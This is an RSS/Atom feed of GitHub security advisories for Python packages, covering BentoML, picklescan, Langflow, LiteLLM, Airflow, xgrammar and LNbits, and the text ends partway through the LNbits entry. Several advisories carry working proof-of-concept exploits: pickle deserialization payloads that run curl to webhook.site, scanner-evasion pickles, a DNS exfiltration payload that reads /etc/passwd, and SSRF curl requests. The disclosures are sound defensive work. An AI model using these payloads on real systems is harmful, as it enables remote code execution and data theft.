<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-04-10T10:01:35.082Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[xgrammar] xgrammar Vulnerable to Denial of Service (DoS) by abusing unbounded cache in memory]]></title>
        <id>https://github.com/advisories/GHSA-389x-67px-mjg3</id>
        <link href="https://github.com/advisories/GHSA-389x-67px-mjg3"/>
        <updated>2025-04-09T19:54:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Xgrammar includes a cache for compiled grammars to increase performance with repeated use of the same grammar. This cache is held in memory. Since the cache is unbounded, a system making use of xgrammar can be abused to fill up a host's memory and case a denial of service. For example, sending many small requests to an LLM inference server with unique JSON schemas would eventually cause this denial of service to occur.</p>
<h3 id="details">Details</h3>
<p>The fix is to add a limit to the cache size. This was done in <a href="https://github.com/mlc-ai/xgrammar/pull/243">https://github.com/mlc-ai/xgrammar/pull/243</a></p>
<p>An example of making use of the new cache size limit can be found in vLLM here: <a href="https://github.com/vllm-project/vllm/pull/16283">https://github.com/vllm-project/vllm/pull/16283</a></p>
<h3 id="impact">Impact</h3>
<p>Any system making use of Xgrammar and taking requests as input from potentially untrusted parties would be vulnerable to this denial of service issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-389x-67px-mjg3</a></li>
<li><a href="https://github.com/mlc-ai/xgrammar/pull/243">https://github.com/mlc-ai/xgrammar/pull/243</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32381">https://nvd.nist.gov/vuln/detail/CVE-2025-32381</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/16283">https://github.com/vllm-project/vllm/pull/16283</a></li>
<li><a href="https://github.com/advisories/GHSA-389x-67px-mjg3">https://github.com/advisories/GHSA-389x-67px-mjg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-389x-67px-mjg3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-09T13:08:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML's runner server Vulnerable to Remote Code Execution (RCE) via Insecure Deserialization]]></title>
        <id>https://github.com/advisories/GHSA-7v4r-c989-xh26</id>
        <link href="https://github.com/advisories/GHSA-7v4r-c989-xh26"/>
        <updated>2025-04-09T20:14:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There was an insecure deserialization in BentoML's runner server. By setting specific headers and parameters in the POST request, it is possible to execute any unauthorized arbitrary code on the server, which will grant the attackers to have the initial access and information disclosure on the server.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>First, create a file named <strong>model.py</strong> to create a simple model and save it</li>
</ul>
<pre><code>import bentoml
import numpy as np

class mymodel:
    def predict(self, info):
        return np.abs(info)
    def __call__(self, info):
        return self.predict(info)

model = mymodel()
bentoml.picklable_model.save_model("mymodel", model)
</code></pre>
<ul>
<li>Then run the following command to save this model</li>
</ul>
<pre><code>python3 model.py
</code></pre>
<ul>
<li>Next, create <strong>bentofile.yaml</strong> to build this model</li>
</ul>
<pre><code>service: "service.py"  
description: "A model serving service with BentoML"  
python:
  packages:
    - bentoml
    - numpy
models:
  - tag: MyModel:latest  
include:
  - "*.py"  
</code></pre>
<ul>
<li>Then, create <strong>service.py</strong> to host this model</li>
</ul>
<pre><code>import bentoml
from bentoml.io import NumpyNdarray
import numpy as np


model_runner = bentoml.picklable_model.get("mymodel:latest").to_runner()

svc = bentoml.Service("myservice", runners=[model_runner])

async def predict(input_data: np.ndarray):

    input_columns = np.split(input_data, input_data.shape[1], axis=1)
    result_generator = model_runner.async_run(input_columns, is_stream=True)
    async for result in result_generator:
        yield result
</code></pre>
<ul>
<li>Then, run the following commands to build and host this model</li>
</ul>
<pre><code>bentoml build
bentoml start-runner-server --runner-name mymodel --working-dir . --host 0.0.0.0 --port 8888
</code></pre>
<ul>
<li>Finally, run this below python script to exploit insecure deserialization vulnerability in BentoML's runner server.</li>
</ul>
<pre><code>import requests
import pickle

url = "http://0.0.0.0:8888/"

headers = {
    "args-number": "1",
    "Content-Type": "application/vnd.bentoml.pickled",
    "Payload-Container": "NdarrayContainer", 
    "Payload-Meta": '{"format": "default"}',
    "Batch-Size": "-1",
}

class P:
    def __reduce__(self):
        return  (__import__('os').system, ('curl -X POST -d "$(id)" https://webhook.site/61093bfe-a006-4e9e-93e4-e201eabbb2c3',))

response = requests.post(url, headers=headers, data=pickle.dumps(P()))

print(response)
</code></pre>
<p>And I can replace the <strong>NdarrayContainer</strong> with <strong>PandasDataFrameContainer</strong> in <strong>Payload-Container</strong> header and the exploit still working.
After running <strong>exploit.py</strong> then the output of the command <strong>id</strong> will be send out to the WebHook server.</p>
<h3 id="root-cause-analysis">Root Cause Analysis:</h3>
<ul>
<li>When handling a request in BentoML runner server in <code>src/bentoml/_internal/server/runner_app.py</code>, when the request header <code>args-number</code> is equal to 1, it will call the function <code>_deserialize_single_param</code> like the code below:</li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L291-L298
async def _request_handler(request: Request) -&gt; Response:
    assert self._is_ready

    arg_num = int(request.headers["args-number"])
    r_: bytes = await request.body()

    if arg_num == 1:
        params: Params[t.Any] = _deserialize_single_param(request, r_)
</code></pre>
<ul>
<li>Then this is the function of <code>_deserialize_single_param</code>, which will take the value of all request headers of <code>Payload-Container</code>, <code>Payload-Meta</code> and <code>Batch-Size</code> and the crafted into <code>Payload</code> class which will contain the data from <code>request.body</code></li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L376-L393
def _deserialize_single_param(request: Request, bs: bytes) -&gt; Params[t.Any]:
    container = request.headers["Payload-Container"]
    meta = json.loads(request.headers["Payload-Meta"])
    batch_size = int(request.headers["Batch-Size"])
    kwarg_name = request.headers.get("Kwarg-Name")
    payload = Payload(
        data=bs,
        meta=meta,
        batch_size=batch_size,
        container=container,
    )
    if kwarg_name:
        d = {kwarg_name: payload}
        params: Params[t.Any] = Params(**d)
    else:
        params: Params[t.Any] = Params(payload)

    return params
</code></pre>
<ul>
<li>After crafting <code>Params</code> containing payload, it will call to function <code>infer</code> with <code>params</code> variable as input</li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L303-L304
try:
  payload = await infer(params)
</code></pre>
<ul>
<li>Inside function <code>infer</code>, the <code>params</code> variable with is belong to class <code>Params</code> will call the function <code>map</code> of that class with <code>AutoContainer.from_payload</code> as a parameter.</li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L278-L289
async def infer(params: Params[t.Any]) -&gt; Payload:
      params = params.map(AutoContainer.from_payload)

      try:
          ret = await runner_method.async_run(
              *params.args, **params.kwargs
          )
      except Exception:
          traceback.print_exc()
          raise

      return AutoContainer.to_payload(ret, 0)
</code></pre>
<ul>
<li>Inside class <code>Params</code> define the function <code>map</code> which will call the <code>AutoContainer.from_payload</code> function with arguments, which are <code>data</code>, <code>meta</code>, <code>batch_size</code> and <code>container</code></li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/utils.py#L59-L66
def map(self, function: t.Callable[[T], To]) -&gt; Params[To]:
    """
    Apply a function to all the values in the Params and return a Params of the
    return values.
    """
    args = tuple(function(a) for a in self.args)
    kwargs = {k: function(v) for k, v in self.kwargs.items()}
    return Params[To](*args, **kwargs)
</code></pre>
<ul>
<li>Inside class <code>AutoContainer</code> class have defined the function <code>from_payload</code> which will find the class by the <code>payload.container</code> , which is the value of header <code>Payload-Container</code>, and it will call the function <code>from_payload</code> from the chosen class as return value</li>
</ul>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L710-L712
def from_payload(cls, payload: Payload) -&gt; t.Any:
    container_cls = DataContainerRegistry.find_by_name(payload.container)
    return container_cls.from_payload(payload)
</code></pre>
<p>And if the attacker set value of header <code>Payload-Container</code> to <code>NdarrayContainer</code> or <code>PandasDataFrameContainer</code>, it will call <code>from_payload</code> and when it then check if the <code>payload.meta["format"] == "default"</code> it will call <code>pickle.loads(payload.data)</code> and <code>payload.meta["format"]</code> is the value of header <code>Payload-Meta</code> and the attacker can set it to <code>{"format": "default"}</code> and <code>payload.data</code> is the value of <code>request.body</code> which is the payload from malicious <code>class P</code> in my request, which will trigger <code>__reduce__</code> method and then execute arbitrary commands (for my example is the <code>curl</code> command)</p>
<pre><code>https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L411-L416
def from_payload(
    cls,
    payload: Payload,
) -&gt; ext.PdDataFrame:
    if payload.meta["format"] == "default":
        return pickle.loads(payload.data)
https://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L306-L312
def from_payload(
    cls,
    payload: Payload,
) -&gt; ext.NpNDArray:
    format = payload.meta.get("format", "default")
    if format == "default":
        return pickle.loads(payload.data)
</code></pre>
<h3 id="impact">Impact</h3>
<p>In the above Proof of Concept, I have shown how the attacker can execute command <strong>id</strong> and send the output of the command to the outside. By replacing <strong>id</strong> command with any OS commands, this insecure deserialization in BentoML's runner server will grant the attacker the permission to gain the remote shell on the server and injecting backdoors to persist access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26">https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32375">https://nvd.nist.gov/vuln/detail/CVE-2025-32375</a></li>
<li><a href="https://github.com/advisories/GHSA-7v4r-c989-xh26">https://github.com/advisories/GHSA-7v4r-c989-xh26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v4r-c989-xh26</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-09T12:59:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM Vulnerable to Denial of Service (DoS) via Crafted HTTP Request]]></title>
        <id>https://github.com/advisories/GHSA-fh2c-86xm-pm2x</id>
        <link href="https://github.com/advisories/GHSA-fh2c-86xm-pm2x"/>
        <updated>2025-04-08T14:39:52.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial of Service (DoS) vulnerability exists in berriai/litellm version v1.44.5. This vulnerability can be exploited by appending characters, such as dashes (-), to the end of a multipart boundary in an HTTP request. The server continuously processes each character, leading to excessive resource consumption and rendering the service unavailable. The issue is unauthenticated and does not require any user interaction, impacting all users of the service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8984">https://nvd.nist.gov/vuln/detail/CVE-2024-8984</a></li>
<li><a href="https://huntr.com/bounties/554fc76b-3097-4223-b4cf-110b853e9355">https://huntr.com/bounties/554fc76b-3097-4223-b4cf-110b853e9355</a></li>
<li><a href="https://github.com/BerriAI/litellm/blob/8c5ff150f6142608ffe968e4e68429f978fda187/litellm/tests/test_spend_logs.py#L242">https://github.com/BerriAI/litellm/blob/8c5ff150f6142608ffe968e4e68429f978fda187/litellm/tests/test_spend_logs.py#L242</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/4f49f836aa844ac9b6bfbeff27e6f6b2b9cf3f61">https://github.com/BerriAI/litellm/commit/4f49f836aa844ac9b6bfbeff27e6f6b2b9cf3f61</a></li>
<li><a href="https://github.com/advisories/GHSA-fh2c-86xm-pm2x">https://github.com/advisories/GHSA-fh2c-86xm-pm2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh2c-86xm-pm2x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-20T12:32:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow Vulnerable to Code Injection via the `/api/v1/validate/code` endpoint]]></title>
        <id>https://github.com/advisories/GHSA-c995-4fw3-j39m</id>
        <link href="https://github.com/advisories/GHSA-c995-4fw3-j39m"/>
        <updated>2025-04-10T01:59:49.000Z</updated>
        <content type="html"><![CDATA[<p>Langflow versions prior to 1.3.0 are susceptible to code injection in the <code>/api/v1/validate/code</code> endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3248">https://nvd.nist.gov/vuln/detail/CVE-2025-3248</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/6911">https://github.com/langflow-ai/langflow/pull/6911</a></li>
<li><a href="https://github.com/langflow-ai/langflow/releases/tag/1.3.0">https://github.com/langflow-ai/langflow/releases/tag/1.3.0</a></li>
<li><a href="https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai">https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai</a></li>
<li><a href="https://github.com/advisories/GHSA-c995-4fw3-j39m">https://github.com/advisories/GHSA-c995-4fw3-j39m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c995-4fw3-j39m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-07T15:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-common-sql] Apache Airflow Common SQL Provider Vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-5r62-mjf5-xwhj</id>
        <link href="https://github.com/advisories/GHSA-5r62-mjf5-xwhj"/>
        <updated>2025-04-07T20:38:27.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Apache Airflow Common SQL Provider.</p>
<p>When using the partition clause in SQLTableCheckOperator as parameter (which was a recommended pattern), Authenticated UI User could inject arbitrary SQL command when triggering DAG exposing partition_clause to the user.
This allowed the DAG Triggering user to escalate privileges to execute those arbitrary commands which they normally would not have.</p>
<p>This issue affects Apache Airflow Common SQL Provider: before 1.24.1.</p>
<p>Users are recommended to upgrade to version 1.24.1, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30473">https://nvd.nist.gov/vuln/detail/CVE-2025-30473</a></li>
<li><a href="https://github.com/apache/airflow/pull/48098">https://github.com/apache/airflow/pull/48098</a></li>
<li><a href="https://lists.apache.org/thread/53klkv790cylqcop0350w7nfq1y6h0t2">https://lists.apache.org/thread/53klkv790cylqcop0350w7nfq1y6h0t2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/04/2">http://www.openwall.com/lists/oss-security/2025/04/04/2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/06/1">http://www.openwall.com/lists/oss-security/2025/04/06/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/06/2">http://www.openwall.com/lists/oss-security/2025/04/06/2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/06/3">http://www.openwall.com/lists/oss-security/2025/04/06/3</a></li>
<li><a href="https://github.com/advisories/GHSA-5r62-mjf5-xwhj">https://github.com/advisories/GHSA-5r62-mjf5-xwhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5r62-mjf5-xwhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-07T09:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Picklescan missing detection when calling built-in python library function timeit.timeit()]]></title>
        <id>https://github.com/advisories/GHSA-v7x6-rv5q-mhwc</id>
        <link href="https://github.com/advisories/GHSA-v7x6-rv5q-mhwc"/>
        <updated>2025-04-07T19:37:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Using timeit.timeit() function, which is a built-in python library function to execute remote pickle file.</p>
<h3 id="details">Details</h3>
<p>Pickle’s deserialization process is known to allow execution of function via reduce method. While Picklescan is meant to detect such exploits, this attack evades detection by calling built-in python library function like <strong>timeit.timeit()</strong>. And since timeit library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.</p>
<p>The attack payload executes in the following steps:</p>
<p>First, the attacker craft the payload by calling to <strong>timeit.timeit()</strong> function from timeit library in <strong>reduce</strong> method
Then, inside reduce method, the attacker import dangerous libarary like os and calling <strong>os.system()</strong> to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.
Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>The attacker crafted a malicious pickle file using built-in python library function timeit.timeit()</li>
</ol>
<pre><code>import pickle
import timeit
class Payload(object):
    def __reduce__(self):
        return timeit.timeit, ('','import os; os.system("curl https://webhook.site/95f3e1c3-ee37-4a5a-8544-ab4ce93475f6")')
def create_payload():
  with open('payload.pickle', 'wb') as f:
    pickle.dump(Payload(), f)
create_payload()
</code></pre>
<p>Then the attacker will send this pickle file to the victim computer and maybe the victim load this pickle using pickle.load()
2. The victim will use picklescan library to check out if the received pickle file is malicious or not</p>
<pre><code>picklescan -p payload.pickle
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 0
Dangerous globals: 0
</code></pre>
<ol start="3">
<li>Beliving that this pickle file is safe using modelscan, the victim then load this pickle file which will trigger timeit.timeit command to execute OS commands (in my example, it was curl command)</li>
</ol>
<pre><code>import pickle
def load_payload():
    with open('payload.pickle', 'rb') as f:
      pickle.load(f)
load_payload()
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: High</p>
<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>
<h3 id="recommended-solution">Recommended Solution</h3>
<p>I suggest adding timeit library to the unsafe globals blacklist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/pull/40">https://github.com/mmaitre314/picklescan/pull/40</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/releases/tag/v0.0.25">https://github.com/mmaitre314/picklescan/releases/tag/v0.0.25</a></li>
<li><a href="https://github.com/advisories/GHSA-v7x6-rv5q-mhwc">https://github.com/advisories/GHSA-v7x6-rv5q-mhwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7x6-rv5q-mhwc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T19:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Picklescan failed to detect to some unsafe global function in Numpy library]]></title>
        <id>https://github.com/advisories/GHSA-fj43-3qmq-673f</id>
        <link href="https://github.com/advisories/GHSA-fj43-3qmq-673f"/>
        <updated>2025-04-07T18:54:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited by import some built-in function in Numpy library that indrectly call some dangerous function like exec() to execute some python code as a parameter, which the attacker can import dangerous library inside like os library and execute arbitrary OS commands.</p>
<h3 id="details">Details</h3>
<p>Pickle’s deserialization process is known to allow execution of function via <strong>reduce</strong> method. While Picklescan is meant to detect such exploits, this attack evades detection by calling function in Numpy library that call dangerous function like exec(). And since Numpy library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.</p>
<p>The attack payload executes in the following steps:</p>
<ul>
<li>First, the attacker craft the payload by import <strong>runstring</strong> function in <strong>numpy.testing._private.utils</strong></li>
<li>Then, inside <strong>reduce</strong> method, the attacker import dangerous libarary like os and calling os.system() to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.</li>
<li>Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>import pickle
import torch
import pickle
from picklescan.scanner import scan_file_path
class Payload:
  def __reduce__(self):
    from numpy.testing._private.utils import runstring
    return runstring, ("import os; os.system('curl https://example.com')",{})
    
def create_payload():
  with open('payload.pickle', 'wb') as f:
    pickle.dump(Payload(), f)

def load_payload():
  result = scan_file_path('payload.pickle')
  if result.infected_files != 0 or result.scan_err:
    print('File is infected')
  else:
    print('File is clean')
    with open('payload.pickle', 'rb') as f:
      pickle.load(f)

create_payload() 
load_payload()
</code></pre>
<h3 id="impact">Impact</h3>
<p>Severity: High</p>
<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. For example, Invoke-AI repository (<a href="https://github.com/invoke-ai/InvokeAI">https://github.com/invoke-ai/InvokeAI</a>)
What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>
<h3 id="recommended-fixes">Recommended Fixes:</h3>
<p>I suggest adding Numpy library to the unsafe globals blacklist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-fj43-3qmq-673f</a></li>
<li><a href="https://github.com/advisories/GHSA-fj43-3qmq-673f">https://github.com/advisories/GHSA-fj43-3qmq-673f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj43-3qmq-673f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T18:54:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Picklescan Vulnerable to Exfiltration via DNS via linecache and ssl.get_server_certificate]]></title>
        <id>https://github.com/advisories/GHSA-93mv-x874-956g</id>
        <link href="https://github.com/advisories/GHSA-93mv-x874-956g"/>
        <updated>2025-04-07T18:52:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Picklescan does not detect malicious pickles that exfiltrate sensitive information via DNS after deserialization.</p>
<h3 id="details">Details</h3>
<p>picklescan’s blacklist can be bypassed to exfiltrate sensitive information (like file contents, secrets, or credentials) during model deserialization by leveraging <code>ssl.get_server_certificate</code> as the callable function in the pickle payload. Since <code>ssl</code> is a standard Python library used for legitimate TLS operations, it is rarely blacklisted by static scanners or runtime monitors.</p>
<p>The payload avoids flagged modules and instead uses <code>linecache</code> (also unflagged) to read local files. The exfiltrated data is added to DNS-safe chunks, and embedded as subdomains in a crafted FQDN.  When passed to <code>ssl.get_server_certificate</code>, the Python runtime performs a DNS resolution to the attacker-controlled domain, leaking the encoded content.</p>
<p>The payload executes the following steps:</p>
<ul>
<li>Reads sensitive local file content using <code>linecache</code> module</li>
<li>Encodes the data for DNS exfiltration</li>
<li>Constructs a malicious domain name using a third party service <code>dnslog.cn</code> </li>
<li>Triggers a DNS resolution via <code>ssl.get_server_certificate</code></li>
<li>Leaks the encoded file content to the attacker</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Before running the PoC change the <code>fqdn</code> to your own or a third party that you control. In this PoC we used <code> fqdn = f"{subdomain}.ctmc2q.dnslog.cn"</code>.</p>
<pre><code class="language-python">
import numpy as np

def create_malicious_model():
# Define the payload class
    class DNSLogPayload:
        def __reduce__(self):
            # Step 1: read a line from /etc/passwd
            linecache = __import__("linecache")
            first_line = linecache.getline("/etc/passwd", 1).strip()

            # Step 2: Sanitize and embed it as a DNS subdomain
            subdomain = first_line.replace(":", "_").replace("/", "_")
            fqdn = f"{subdomain}.dns-logger.invalid"

            # Step 3: Use ssl.get_server_certificate to trigger DNS resolution
            ssl_mod = __import__("ssl")
            return (getattr(ssl_mod, "get_server_certificate"), ((fqdn, 443),))

    # Wrap the payload in a NumPy object array
    arr = np.array([DNSLogPayload()], dtype=object)

    # Save to .npy file
    np.save("dnslog_trigger_payload.npy", arr, allow_pickle=True)   

def load_model(model):
    try:
        return np.load(model, encoding="latin1", fix_imports=True, allow_pickle=1)
    except Exception:
        raise ValueError("Invalid file")

if __name__ == "__main__":
    create_malicious_model()
    model = "dnslog_trigger_payload.npy"
    print("[i] Loading and executing the model")
    data = load_model(model)
 
</code></pre>
<h3 id="impact">Impact</h3>
<ol>
<li>Evade detection: Bypasses the latest version of picklescan's blacklist. </li>
<li>Exfiltrate sensitive local files to an attacker controlled DNS</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-93mv-x874-956g">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-93mv-x874-956g</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/pull/40">https://github.com/mmaitre314/picklescan/pull/40</a></li>
<li><a href="https://github.com/advisories/GHSA-93mv-x874-956g">https://github.com/advisories/GHSA-93mv-x874-956g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93mv-x874-956g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-07T18:52:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lnbits] LNbits Lightning Network Payment System Vulnerable to Server-Side Request Forgery via LNURL Authentication Callback]]></title>
        <id>https://github.com/advisories/GHSA-qp8j-p87f-c8cc</id>
        <link href="https://github.com/advisories/GHSA-qp8j-p87f-c8cc"/>
        <updated>2025-04-10T01:55:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="server-side-request-forgery-via-lnurl-authentication-callback-in-lnbits-lightning-network-payment-system">Server-Side Request Forgery via LNURL Authentication Callback in LNbits Lightning Network Payment System</h1>
<h2 id="disclaimer">Disclaimer</h2>
<p>This vulnerability was detected using <strong><a href="https://xbow.com/">XBOW</a></strong>, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports.</p>
<h2 id="description">Description</h2>
<p>A Server-Side Request Forgery (SSRF) vulnerability has been discovered in LNbits' LNURL authentication handling functionality. The vulnerability exists in the LNURL authentication callback process where the application makes HTTP requests to user-provided callback URLs and follows redirects without proper validation.</p>
<p>When processing LNURL authentication requests, the application accepts a callback URL parameter and makes an HTTP request to that URL using the httpx library with redirect following enabled. The application doesn't properly validate the callback URL, allowing attackers to specify internal network addresses and access internal resources.</p>
<p>This vulnerability allows an attacker to make the application send HTTP requests to arbitrary internal network locations, potentially exposing sensitive information or accessing internal services that should not be accessible from the internet.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create a new wallet account to get an admin key:</li>
</ol>
<pre><code>curl -X POST http://target:5000/api/v1/account -d '{"name":"test"}'
</code></pre>
<ol start="2">
<li>Use the obtained admin key to send a crafted LNURL authentication request:</li>
</ol>
<pre><code>curl -X POST http://target:5000/api/v1/lnurlauth \
  -H "X-Api-Key: &lt;admin_key&gt;" \
  -H "Content-Type: application/json" \
  -d '{
    "callback": "http://target-internal-server/?tag=login&amp;k1=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    "k1": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    "sig": "0"*128,
    "key": "0"*64
  }'
</code></pre>
<p>The application will make an HTTP request to the internal URL specified in the callback parameter and return its contents in the response, allowing access to internal resources that should not be accessible.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Implement strict URL validation for callback URLs, ensuring they only point to allowed domains and networks.</li>
<li>Use a whitelist of allowed domains and IP ranges for callback URLs.</li>
<li>Disable redirect following in HTTP requests or implement strict redirect validation.</li>
<li>Consider using a proxy service that restricts access to internal networks when making external HTTP requests.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>This vulnerability allows authenticated attackers to access internal network resources that should not be accessible from the internet. While authentication is required to exploit this vulnerability, any user who can create a wallet gets the necessary access level. The vulnerability can be used to read internal files, access internal services, and potentially expose sensitive information from the internal network.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
